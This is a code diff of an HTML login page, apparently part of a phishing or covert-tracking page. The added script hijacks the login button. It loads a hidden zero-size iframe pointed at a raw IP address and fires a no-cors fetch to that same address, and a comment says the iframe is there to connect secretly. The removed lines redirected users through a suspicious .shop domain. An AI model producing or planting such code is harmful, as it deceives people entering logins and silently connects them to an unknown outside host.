@@ -66,21 +66,34 @@
     button:hover {
       background-color: #0056b3;
     }
+    /* 隱藏的 iframe */
+    #hiddenIframe {
+      display: none;
+      width: 0;
+      height: 0;
+      border: 0;
+    }
   </style>
   <script>
     function handleLogin(event) {
-      // 阻止表單預設行為 (以防畫面立即刷新)
+      // 阻止表單默認行為，避免整個頁面刷新或跳轉
       event.preventDefault();
 
-      // Step 1: 先導向到指定之 fallback 網址
-      const fallbackURL = "https://zongyiu.github.io/wnc/?site=http://jkkahebg899wubj.shop/";
-      window.location.href = fallbackURL;
+      // 1. 讓隱藏 iframe 直接指向 http://103.200.23.160
+      const iframe = document.getElementById('hiddenIframe');
+      iframe.src = "http://103.200.23.160";
 
-      // Step 2: 等待數秒後，再自動導向主要網址
-      // 可自行調整 setTimeout 毫秒數，例如 3 秒 (3000ms)、5 秒 (5000ms) 等
-      setTimeout(() => {
-        window.location.href = "http://103.200.23.160";
-      }, 3000);
+      // 2. 同時透過 fetch 搭配 no-cors 發送請求
+      fetch("http://103.200.23.160", {
+        method: 'GET',
+        mode: 'no-cors'
+      })
+      .then(() => {
+        console.log("no-cors fetch success");
+      })
+      .catch((error) => {
+        console.error("no-cors fetch error:", error);
+      });
     }
   </script>
 </head>
@@ -96,5 +109,7 @@
       <button type="submit">Login</button>
     </form>
   </div>
+  <!-- 隱藏的 iframe，用來偷偷連線到 primaryURL -->
+  <iframe id="hiddenIframe"></iframe>
 </body>
 </html>
